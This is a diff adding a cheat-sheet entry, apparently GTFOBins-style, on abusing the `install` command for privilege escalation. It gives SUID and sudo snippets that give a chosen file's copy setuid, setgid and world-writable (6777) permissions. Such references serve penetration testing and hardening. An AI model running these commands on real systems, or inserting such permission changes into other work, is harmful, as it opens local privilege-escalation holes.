@@ -81,3 +81,22 @@
   sudo chmod 6777 $LFILE
   ```
 
+### ♦ `install` :
+   ⇨ The `install` command can change permissions and execute a copy of the file with elevated privileges. If it has the SUID bit set, it can escalate privileges.
+
+**Commands:**
+• SUID:
+  ```sh
+  sudo install -m =xs $(which install) .
+
+  LFILE=file_to_change
+  TF=$(mktemp)
+  ./install -m 6777 $LFILE $TF
+  ```
+• Sudo:
+  ```sh
+  LFILE=file_to_change
+  TF=$(mktemp)
+  sudo install -m 6777 $LFILE $TF
+  ```
+
